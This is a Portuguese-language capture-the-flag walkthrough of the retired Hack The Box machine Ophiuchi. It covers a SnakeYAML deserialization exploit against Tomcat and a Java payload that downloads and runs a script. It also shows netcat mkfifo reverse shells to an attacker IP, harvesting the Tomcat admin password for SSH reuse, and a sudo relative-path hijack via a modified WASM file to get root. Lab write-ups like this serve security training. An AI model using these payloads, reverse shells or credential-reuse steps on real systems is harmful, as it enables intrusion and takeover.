---
layout: single
title: "Walktrough: HTB Ophiuchi"
namespace: htb-ophiuchi
category: Walkthrough
tags:
  - HackTheBox
  - HTB Medium
  - HTB Linux
date: 2021-07-03 16:00:00
header:
  teaser: https://i.imgur.com/r9JpwZX.png
  og_image: *teaser
redirect_from: /writeup/2021/07/htb-ophiuchi
---

Olá pessoal!

A máquina desta semana será **Ophiuchi**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [felamos](https://app.hackthebox.eu/users/27390).<!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
{: .notice--info}

![htb-ophiuchi](https://i.imgur.com/RgW95kn.png){: .align-center}

Recentemente tenho iniciado os trabalhos nas máquinas do HTB por pesquisar sobre seu nome, pois ele ou a imagem podem "dar dicas" sobre como realizar a exploração.

Ao buscar `define ophiuchi` no Google fui redirecionado para `define ophiucus`, que é uma constelação e seu nome em Português é *Serpentário*, o que faz algum sentido dado a imagem que temos um planeta e algumas estrelas, mas em breve veremos que não é apenas isso! :smiley:

## Enumeração

Começamos a enumeração, como de costume, executando scan rápido no `nmap` para identificar os serviços publicados nesta máquina.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.227
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 17:32 -03
Nmap scan report for 10.10.10.227
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
```

### 8080/TCP - Tomcat

Acessando a página tomcat em `http://10.10.10.227:8080` vemos uma página para parsing de YAML, conforme podemos ver abaixo:

![Ophiuchi - Parse YAML](https://i.imgur.com/oDXT0S9.png){: .align-center}

Ao enviar um valor YAML simples (`teste: true`), a seguinte mensagem é retornada:

> Due to security reason this feature has been temporarily on hold. We will soon fix the issue!

Já que o Tomcat é um webserver para aplicações java e, com base na mensagem retornada, busquei por `java yaml rce vulnerability` onde encontrei [um post no Medium](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) sobre uma vulnerabilidade chamada **SnakeYAML**, em que a prova de conceito nesta página se parecia bastante com a página a ser explorada. Adicionalmente, como *Snake* faz referência ao nome da constelação *ophiucus*, mostra que estamos no caminho certo :smile:.

Seguindo a sugestão, iniciado um servidor http via `sudo python3 -m http.server 80` e enviado o seguinte payload ao website:

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.10.10/"]
  ]]
]
```

Conforme a PoC no site, o servidor busca um arquivo em `/META-INF/services/javax.script.ScriptEngineFactory` que, contenha uma classe Java a ser executada, o que pode ser confirmado com base nos logs do python http server.

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.227 - - [28/Feb/2021 12:19:22] code 404, message File not found
10.10.10.227 - - [28/Feb/2021 12:19:22] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -
```

## Acesso inicial

Para obter o acesso inicial utilizei o projeto mencionado no post encontrado ([artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads](https://github.com/artsploit/yaml-payload)).

```bash
git clone https://github.com/artsploit/yaml-payload.git
```

Conforme recomendado, vamos colocar o nosso payload na classe chamada `AwesomeScriptEngineFactory.java` e compilá-lo, para que seja invocado utilizando o mecanismo que pudemos validar no formulário.

Ao modificar inicialmente o arquivo `yaml-payload\src\artsploit\AwesomeScriptEngineFactory.java`, incluí o payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f`, porém como possui alguns redirects e pipelines (`>` e `|`) notei que não funcionou conforme esperado e parti para a estratégia de colocar o payload em um arquivo de texto na máquina local, a ser baixado via HTTP para a subsequente execução na máquina alvo conforme abaixo:

```java
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("wget http://10.10.10.10/payload -O /tmp/exploit.sh");
            Runtime.getRuntime().exec("chmod a+x /tmp/exploit.sh");
            Runtime.getRuntime().exec("bash /tmp/exploit.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

Após modificar a classe, precisamos compilá-la para que seja executada e disponibilizar o arquivo `*.jar` no diretório de onde vamos chamá-lo.

```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

Após compilado, precisamos configurar um HTTP Server com o arquivo payload contendo a nossa instrução para shell reverso e enviar o payload a seguir no formulário web

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.10.10/yaml-payload.jar"]
  ]]
]
```

Voilá! temos um shell reverso na máquina! :smile:

```bash
bash-5.0$ hostname && id
ophiuchi
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
bash-5.0$
```

## User flag

Iniciamos a enumeração como de costume executando o `linpeas.sh`, onde pudemos identificar os seguintes pontos:

- Execução com a conta de serviço do Tomcat, com a qual temos privilégios de leitura dos arquivos relacionados à configuração do serviço e respectivas logs
- O usuário a ser buscado é o **admin**, único com acesso console à máquina.

Com estas informações, realizado consulta do arquivo `/opt/tomcat/conf/tomcat-users.xml` que possui as credenciais dos usuários do tomcat, para que pudéssemos acessar a console

```xml
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```

Uma vez que temos as credenciais de administração do Tomcat, foi possível acessar a console de gerenciamento confirmando que a credencial encontrada era válida.

![Ophiuchi - Tomcat Manager](https://i.imgur.com/x7m50Ah.png){: .align-center}

Como temos uma conta no Linux chamada `admin`, ao tentar reutilizar a mesma credencial via ssh, tivemos êxito ao reutilizar a senha que possuíamos, obtendo assim a flag de usuário.

```bash
Last login: Sun Apr 18 01:22:24 2021 from 10.10.10.10
-bash-5.0$ hostname && id
ophiuchi
uid=1000(admin) gid=1000(admin) groups=1000(admin)
-bash-5.0$ cat user.txt 
<redacted>
-bash-5.0$
```

## Root flag

Embora normalmente execute o `linpeas.sh` para uma enumeração mais completa, uma vez que temos a senha do usuário **admin**, uma coisa que sempre valido é se o usuário em questão possui privilégios de sudo em algum tipo de processo/comando.

Ao executar desta vez tive a felicidade de ver o seguinte output:

```bash
-bash-5.0$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

Inspecionando o arquivo `/opt/wasm-functions/index.go` temos o seguinte conteúdo:

```go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

Como podemos ver, as variáveis são carregadas a partir do arquivo `main.wasm` e, se a variavel `f` em `info` for igual à **1**, o arquivo `deploy.sh` é executado.

Como ambos os arquivos (`main.wasm` e `deploy.sh`) executam a partir de um caminho relativo, são vulneráveis a **path hijacking**, o que realizaremos agora.

O passo inicial é criar os dois arquivos conforme faremos nos passos a seguir executando a partir de um diretório onde temos privilégio de gravação, neste caso em `/dev/shm`.

```bash
mkdir /dev/shm/zurc
cd /dev/shm/zurc
```

### `deploy.sh`

A crição deste arquivo será bem simples. Apenas criaremos um script no diretório recém-criado e executar o comando `id` para comprovar a execução.

```bash
#!/bin/bash

id
```

Uma vez que o procedimento funcione, alteraremos o script para o seguinte, que enviará um shell reverso para a máquina atacante

```bash
#!/bin/bash

rm /tmp/zurc;mkfifo /tmp/zurc;cat /tmp/zurc|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/zurc
```

### `main.wasm`

Este item é um pouco mais complexo, pois abrindo um dos arquivos encontrados em um editor, notamos que se trata de algo compilado e não um arquivo em texto plano.

Pesquisando um pouco em como modificar um arquivo wasm, encontrei no site Mozilla developers [como converter um WebAssembly Text para WASM](https://developer.mozilla.org/en-US/docs/WebAssembly/Text_format_to_wasm), que faz referência ao repositório [WebAssembly/wabt: The WebAssembly Binary Toolkit no GitHub](https://github.com/webassembly/wabt).

Os seguintes passos foram realizados para inspecionar e modificar o arquivo `main.wasm`:

- Localizado o arquivo `main.wasm` na máquina e copiado o principal para a máquina atacante

  ```bash
  # Ophiuchi
  admin@ophiuchi:~$ find / -type f 2> /dev/null | grep main.wasm
  /opt/wasm-functions/main.wasm
  /opt/wasm-functions/backup/main.wasm
  ```

  ```bash
  # Attacker Machine
  $ cd ./loot
  $ scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .
  ```

- Baixado versão compilada do `wabt` para o diretório onde estávamos trabalhando

  ```bash
  wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz
  tar -xzvf wabt-1.0.23-ubuntu.tar.gz
  ```

- Convertido `main.wasm` para `main.wat`, retornando o seguinte conteúdo

  ```bash
  $ wabt-1.0.23/bin/wasm2wat main.wasm -o main.wat
  $ cat main.wat                                                                                           
  (module
    (type (;0;) (func (result i32)))
    (func $info (type 0) (result i32)
        i32.const 0)
    (table (;0;) 1 1 funcref)
    (memory (;0;) 16)
    (global (;0;) (mut i32) (i32.const 1048576))
    (global (;1;) i32 (i32.const 1048576))
    (global (;2;) i32 (i32.const 1048576))
    (export "memory" (memory 0))
    (export "info" (func $info))
    (export "__data_end" (global 1))
    (export "__heap_base" (global 2)))
  ```

- Uma vez que precisamos retornar o valor `f == 1`, o valor vem da função `info`, onde faremos a alteração do valor `i32.const 0` para `i32.const 1`

- Após alterá-lo, compilei novamente o arquivo para `main.wasm`, conforme comando abaixo e copiei para a máquina vítima no diretório que estamos trabalhando

  ```bash
  wabt-1.0.23/bin/wat2wasm main.wat -o main.wasm
  scp main.wasm admin@10.10.10.227:/dev/shm/zurc
  ```
  
- Em uma segunda tentativa tive sucesso na execução do código :smiley:

  ```bash
  admin@ophiuchi:/dev/shm/zurc$ sudo /usr/bin/go run /opt/wasm-functions/index.go
  Ready to deploy
  uid=0(root) gid=0(root) groups=0(root)
  ```
  
- Uma vez confirmado o funcionamento, alterado o conteúdo do arquivo `deploy.sh` conforme previamente mencionado para obter o shell reverso, onde pude assim obter a flag de root.

  ```bash
  $ nc -lnvp 4443
  listening on [any] 4443 ...
  connect to [10.10.10.10] from (UNKNOWN) [10.10.10.227] 50068
  # hostname && id
  ophiuchi
  uid=0(root) gid=0(root) groups=0(root)
  # cat /root/root.txt
  <redacted>
  ```

Espero que tenham gostado!

Vejo vocês no próximo post :smile:
